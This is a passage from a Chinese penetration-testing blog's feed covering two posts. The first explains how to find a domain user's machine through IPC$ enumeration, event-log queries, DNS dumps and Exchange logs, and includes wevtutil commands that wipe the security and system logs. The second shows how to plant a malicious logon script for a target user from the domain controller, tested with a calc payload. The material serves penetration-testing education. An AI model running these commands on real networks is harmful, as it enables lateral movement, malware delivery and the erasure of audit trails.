class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">                )</span><br><span class="line">                <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ /<span class="built_in">del</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>域管不用建立连接就可以访问域内计算机资源，因此以域管权限运行时可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>代码补充：<a href="https://github.com/RcoIl/CSharp-Tools/tree/master/NetWorkConnectIPC" target="_blank" rel="noopener">NetWorkConnectIPC</a></p><h2 id="0x02-域控日志"><a href="#0x02-域控日志" class="headerlink" title="0x02 域控日志"></a>0x02 域控日志</h2><p><code>wevtutil</code>为Windows 事件命令行实用程序，其导出的日志为evtx格式（即Windows日志本身的存储格式），可以使用Windows事件查看器分析，Crtl+F查找，或者不使用<code>epl</code>参数，直接重定向输出即可。<br><code>wevtutil</code>常用的场景是清理日志。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl application</span><br><span class="line">wevtutil cl security</span><br><span class="line">wevtutil cl system</span><br><span class="line">wevtutil cl <span class="string">"windows powershell"</span></span><br></pre></td></tr></table></figure></p><p>而它也可作为筛选分析日志的工具。这里需要注意的几个ID分别为：4624（用户登陆成功）、4768、4776（用户账号验证成功）</p><font color="#0099ff" size="3">使用<code>wevtutil</code>结合python</font><ul><li><p>wevtutil</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe security /q:"Event[System[(EventID=<span class="number">4624</span> or EventID=<span class="number">4768</span> or EventID=<span class="number">4776</span>)]]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">1</span> &gt; EvtLogon.dat</span><br></pre></td></tr></table></figure></li><li><p>参数说明</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">qe:</span> 从日志或日志文件中查询事件；（默认xml格式显示）</span><br><span class="line"><span class="string">Security:</span> 指定安全事件的日志；</span><br><span class="line">/<span class="string">q:</span> 筛选规则，可以打开Windows事件查看器的筛选器配置筛选条件后转至XML复制筛选规则；</span><br><span class="line">/<span class="string">f:</span> 以text格式显示</span><br><span class="line">/<span class="string">rd:</span> 指定读取事件的方向</span><br><span class="line">/<span class="string">c:</span> 指定个数</span><br><span class="line">该命令其它参数参考wevtutil /?</span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="comment"># Python v2.7.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">evt = <span class="string">'EvtLogon.dat'</span></span><br><span class="line">fevt = open(evt,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># For Eliminate redundancies</span></span><br><span class="line">    lastdate = <span class="string">'lastdate'</span></span><br><span class="line">    lasttask = <span class="string">'lasttask'</span></span><br><span class="line">    <span class="comment"># 因为windows下的换行符问题，导致写的文件会有空行，使用二进制模式打开</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'LogonStat.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        csv_write = csv.writer(csvfile)</span><br><span class="line">        csv_write.writerow([<span class="string">"Task"</span>, <span class="string">"Date"</span>, <span class="string">"Account Name"</span>, <span class="string">"Account Domain"</span>, <span class="string">"Logon Address"</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> eachline <span class="keyword">in</span> fevt:</span><br><span class="line">            <span class="keyword">if</span> eachline.find(<span class="string">'Event['</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = <span class="string">''</span></span><br><span class="line">                date = <span class="string">''</span></span><br><span class="line">                accname = <span class="string">''</span></span><br><span class="line">                logontype = <span class="string">''</span></span><br><span class="line">                logonaddr = <span class="string">''</span></span><br><span class="line">                skip = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Date:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                date = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Task:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (date == lastdate) <span class="keyword">and</span> (task == lasttask): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lastdate = date</span><br><span class="line">                    lasttask = task</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Name:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accname = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (task == <span class="string">'Logon'</span>) <span class="keyword">and</span> (accname.find(<span class="string">'$'</span>) &gt; <span class="number">-1</span>): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Domain:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accdomain = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Source Network Address:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                logonaddr = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">                <span class="keyword">if</span> logonaddr == <span class="string">'-'</span>:</span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (skip == <span class="number">0</span>) <span class="keyword">and</span> (task == <span class="string">'Logon'</span>):</span><br><span class="line">                    LogonStat = [[task, date, accname, accdomain, logonaddr]]</span><br><span class="line">                    csv_write.writerows(LogonStat)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error: %s'</span> % e</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fevt.close()</span><br><span class="line">csvfile.close()</span><br></pre></td></tr></table></figure></li></ul><p>PS: 筛选条件还有很多，都可以组合利用，从而筛选出自己所需要的信息。<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe Security /q:"*[EventData[Data[@Name='LogonType']='<span class="number">10</span>'] and EventData[Data[@Name='TargetUserName']='RcoIl'] and System[(EventID=<span class="number">4624</span>) and TimeCreated[timediff(@SystemTime) &amp;lt;= <span class="number">2592000000</span>]]]"</span><br><span class="line"></span><br><span class="line">wevtutil qe Security /q:"*[System[(Keywords='<span class="number">0</span>x8020000000000000')] and EventData[Data[@Name='SubjectUserName']='RcoIl']]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">2</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-DNS解析记录"><a href="#0x03-DNS解析记录" class="headerlink" title="0x03 DNS解析记录"></a>0x03 DNS解析记录</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscmd <span class="number">127.0</span>.<span class="number">0.1</span> /enumrecords demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span>. /type A <span class="comment">//利用dnscmd导出dns正向解析记录</span></span><br><span class="line">dnscmd <span class="number">127.0</span>.<span class="number">0.1</span> /zoneprint demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> &gt;<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p><code>C# .NET</code> 编写的工具 <a href="https://github.com/RcoIl/CSharp_Tools/tree/master/SharpADDNSDump" target="_blank" rel="noopener">SharpADDNSDump</a></p><h2 id="0x04-Exchange-日志"><a href="#0x04-Exchange-日志" class="headerlink" title="0x04 Exchange 日志"></a>0x04 Exchange 日志</h2><h3 id="4-1-Outlook-Web-Application"><a href="#4-1-Outlook-Web-Application" class="headerlink" title="4.1 Outlook Web Application"></a>4.1 <code>Outlook Web Application</code></h3><p><code>owa</code> 默认的登陆日志位置如下：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\i</span>netpub<span class="symbol">\l</span>ogs<span class="symbol">\L</span>ogFiles<span class="symbol">\W</span>3SVC1（W3SVC2）</span><br></pre></td></tr></table></figure><p>日志是根据时间（天）¬为单位进行分割的，比如 <code>u_ex190426</code> 就表示 <code>19 年 4 月 26 号</code>那一天的日志。</p><p>在实战中，可根据自己的实际需求，把指定时间段内的日志想办法拖回来即可。</p><p>部分内容如下：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019<span class="string">-04</span><span class="string">-26</span> 06:49:51 192.10.20.200 POST /owa/auth.owa &amp;CorrelationID=&lt;empty&gt;;&amp;ClientId=KFTFMZBXS0ATOXTCCJLOQ&amp;cafeReqId=c3db90a9<span class="string">-02</span>e3<span class="string">-4</span>fd0<span class="string">-8633</span><span class="string">-05</span>fb7799f4fd; 443 rcoil.me\pentest 192.10.20.104 Mozilla/5.0+(Windows+NT<span class="string">+10</span>.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/73.0.3683.103+Safari/537.36 https://exchange/owa/auth/logon.aspx?replaceCurrent=1&amp;url=https%3a%2f%2fexchange%2fowa 302 0 0 31</span><br></pre></td></tr></table></figure><p>此时我们需要的内容单单为：<code>rcoil.me\pentest 192.10.20.104</code>，其他数据可不理会。</p><h3 id="4-2-Outlook-客户端"><a href="#4-2-Outlook-客户端" class="headerlink" title="4.2 Outlook 客户端"></a>4.2 <code>Outlook</code> 客户端</h3><p><code>Outlook</code> 客户端登陆的默认日志文件如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft\Exchange Server\V14\Logging\RPC<span class="built_in"> Client </span>Access</span><br></pre></td></tr></table></figure><h2 id="0x05【参考】"><a href="#0x05【参考】" class="headerlink" title="0x05【参考】"></a>0x05【参考】</h2><p><a href="http://cate4cafe.com/2018/11/21/wevtutil%E7%AD%9B%E9%80%89windows%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C/" target="_blank" rel="noopener">wevtutil筛选windows日志查询结果</a><br><a href="https://blog.csdn.net/dearggae/article/details/70147511" target="_blank" rel="noopener">[Tools]获取域环境内所有用户登录信息（附源码及程序）</a><br><a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢？</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前见到有人在讨论&lt;a href=&quot;https://www.t00ls.net/viewthread.php?tid=47649&amp;amp;extra=&amp;amp;page=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;域内用户在域内的机器ip怎么查呢&lt;/a&gt;，集思广益，结合答复及自己的观点，总结了以下内容。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/"/>
    <id>https://rcoil.me/2018/11/【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本/</id>
    <published>2018-11-16T08:33:21.000Z</published>
    <updated>2019-11-06T07:07:32.527Z</updated>
    
    <content type="html"><![CDATA[<p><font color="#DC143C" size="3">摘要：</font>采取直接的手段不能够解决问题，只好曲线救国。<br><a id="more"></a><br>声明：只是作为搬运工。</p><h2 id="0x00-利用场景"><a href="#0x00-利用场景" class="headerlink" title="0x00 利用场景"></a>0x00 利用场景</h2><ul><li><p>利用前置条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域管理员权限</span><br></pre></td></tr></table></figure></li><li><p>使用场合</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">知道目标域用户名称，探测不到域用户对应机器名或<span class="built_in">IP</span>；</span><br><span class="line">知道目标机器<span class="built_in">IP</span>，但是无法通往上控；</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x01-利用方法"><a href="#0x01-利用方法" class="headerlink" title="0x01 利用方法"></a>0x01 利用方法</h2><p><font color="#DC143C" size="3">PS：</font>以下测试全部在域控上执行</p><h3 id="一）使用dsmod给指定域用户设置登陆脚本"><a href="#一）使用dsmod给指定域用户设置登陆脚本" class="headerlink" title="一）使用dsmod给指定域用户设置登陆脚本"></a>一）使用dsmod给指定域用户设置登陆脚本</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">dsmod<span class="built_in"> user </span>-loscr <span class="string">"test.bat"</span> <span class="string">"CN=x,OU=x,DC=x,DC=x,DC=x"</span></span><br></pre></td></tr></table></figure></p><p>测试结果：<br>PS: 测试机为<code>Win-XP x86</code>，第二次注销重新登陆bat脚本才执行，bat内容为<a href="mailto:`@calc.exe" target="_blank" rel="noopener">`@calc.exe</a>`。<br><img src="/image/【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本/blog_2018-11-16_18-18-23.png" alt=""></p><h3 id="二）登陆脚本给指定用户种马"><a href="#二）登陆脚本给指定用户种马" class="headerlink" title="二）登陆脚本给指定用户种马"></a>二）登陆脚本给指定用户种马</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">net<span class="built_in"> user </span>xp /scriptpath:test.bat # 内网域成员机器可以使用</span><br><span class="line">gpupdate /force  # 立即刷新组策略 使用域管权限执行  不执行也行,等待随机</span><br></pre></td></tr></table></figure></p><p>测试结果与第一种方法一致</p><h3 id="三）使用PowerShell的Active-Directory模块"><a href="#三）使用PowerShell的Active-Directory模块" class="headerlink" title="三）使用PowerShell的Active Directory模块"></a>三）使用PowerShell的Active Directory模块</h3><p><code>ActiveDirectory.psd1</code>项目：<a href="https://github.com/samratashok/ADModule" target="_blank" rel="noopener">ADModule</a><br>命令：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> ActiveDirectory.psd1; 或者<span class="keyword">Import</span>-<span class="keyword">Module</span> Microsoft.ActiveDirectory.Management.dll</span><br><span class="line"><span class="keyword">Set</span>-ADUser -<span class="keyword">Identity</span> AD_USER -ProfilePath <span class="string">"filepath"</span> -ScriptPath <span class="string">"filename"</span></span><br></pre></td></tr></table></figure></p><p>参数说明</p><ul><li><p>Identity<br>通过提供以下属性值之一指定Active Directory用户对象。括号中的标识符是属性的LDAP显示名称。此参数的可接受值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一个名字</span><br><span class="line">GUID（objectGUID）</span><br><span class="line">安全标识符（objectSid）</span><br><span class="line">SAM帐户名称（sAMAccountName）</span><br></pre></td></tr></table></figure></li><li><p>ProfilePath<br>指定用户配置文件的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</p></li><li>ScriptPath<br>指定用户登录脚本的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</li></ul><p>测试结果与第一种方法一致</p><h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p><a href="http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/</a><br><a href="https://www.t00ls.net/thread-48540-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-48540-1-1.html</a><br><a href="https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html</a><br><a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;#DC143C&quot; size=&quot;3&quot;&gt;摘要：&lt;/font&gt;采取直接的手段不能够解决问题，只好曲线救国。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
